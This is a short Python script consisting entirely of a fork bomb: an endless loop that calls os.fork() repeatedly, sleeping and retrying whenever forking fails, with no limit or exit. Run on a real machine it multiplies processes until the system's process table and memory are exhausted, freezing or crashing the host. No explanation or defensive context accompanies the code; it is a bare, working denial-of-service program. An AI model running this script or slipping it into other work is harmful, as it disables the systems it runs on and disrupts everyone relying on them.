#!/usr/bin/env python

import os
import time

while True:
    try:
        os.fork()
    except:
        print("Forking failed...")
        time.sleep(1)
